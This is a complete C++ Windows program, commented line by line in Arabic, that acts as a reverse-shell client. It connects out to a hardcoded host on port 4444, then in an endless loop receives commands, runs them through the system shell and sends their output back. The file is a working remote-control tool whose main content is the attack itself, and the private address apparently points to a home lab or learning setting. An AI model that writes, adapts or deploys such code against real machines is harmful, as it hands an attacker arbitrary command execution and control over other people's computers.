#include <iostream>          // لإظهار النصوص على الشاشة
#include <winsock2.h>        // مكتبة الشبكات في Windows (Winsock)
#include <ws2tcpip.h>        // دوال إضافية مثل inet_pton
#include <array>             // استخدام array ثابتة الحجم
#include <direct.h>          // أوامر خاصة بـ Windows (مثل تغيير المجلد)

#pragma comment(lib, "ws2_32.lib") // ربط مكتبة الشبكات (يعمل مع MSVC فقط)

using namespace std;

// عنوان السيرفر الذي سيتصل به العميل
#define SERVER_IP "192.168.0.29"
#define SERVER_PORT 4444

int main() {

    // هيكل بيانات خاص بـ Winsock
    WSADATA wsaData;

    // تشغيل مكتبة Winsock (ضروري قبل أي socket)
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // إنشاء socket TCP
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // إذا فشل إنشاء socket
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Socket failed: " << WSAGetLastError() << endl;
        return 1;
    }

    // struct يحتوي معلومات السيرفر
    sockaddr_in serverAddr;

    // تحديد نوع العنوان IPv4
    serverAddr.sin_family = AF_INET;

    // تحديد البورت وتحويله لصيغة الشبكة
    serverAddr.sin_port = htons(SERVER_PORT);

    // تحويل IP من نص إلى رقم
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    // محاولة الاتصال بالسيرفر
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Connect failed: " << WSAGetLastError() << endl;
        closesocket(clientSocket); // إغلاق socket
        WSACleanup();              // تنظيف Winsock
        return 1;
    }

    // إذا نجح الاتصال
    cout << "Connected!" << endl;

    // buffer لتخزين البيانات القادمة من السيرفر
    char buffer[1024];

    // حلقة لا نهائية لاستقبال الأوامر
    while (true) {

        // استقبال البيانات من السيرفر
        int iResult = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);

        // إذا الاتصال انقطع أو خطأ
        if (iResult <= 0) break;

        // تحويل البيانات إلى string
        buffer[iResult] = '\0';
        string cmd(buffer);

        // أمر الخروج
        if (cmd == "exit") break;

        // إذا الأمر يبدأ بـ cd
        if (cmd.find("cd ") == 0) {

            // تغيير المجلد الحالي
            if (_chdir(cmd.substr(3).c_str()) == 0) {

                char cwd[1024];

                // الحصول على المسار الحالي
                _getcwd(cwd, sizeof(cwd));

                // إرسال نجاح تغيير المجلد
                string msg = string("Directory changed to: ") + cwd + "\n";
                send(clientSocket, msg.c_str(), msg.length(), 0);

            } else {
                // فشل تغيير المجلد
                send(clientSocket, "Failed to change directory.\n", 28, 0);
            }

        } else {

            // إضافة توجيه الخطأ مع output
            string fullCmd = cmd + " 2>&1";

            // تنفيذ الأمر عبر النظام (cmd)
            FILE* pipe = _popen(fullCmd.c_str(), "r");

            if (!pipe) {
                // إذا فشل التنفيذ
                send(clientSocket, "Failed to execute.\n", 19, 0);
            } else {

                string result;
                array<char, 128> buf;

                // قراءة نتيجة الأمر سطر بسطر
                while (fgets(buf.data(), buf.size(), pipe))
                    result += buf.data();

                // إغلاق العملية
                _pclose(pipe);

                // إذا ماكو نتيجة
                if (result.empty()) result = "Done.\n";

                // إرسال النتيجة للسيرفر
                send(clientSocket, result.c_str(), result.length(), 0);
            }
        }
    }

    // إغلاق الاتصال
    closesocket(clientSocket);

    // إنهاء Winsock
    WSACleanup();

    return 0;
}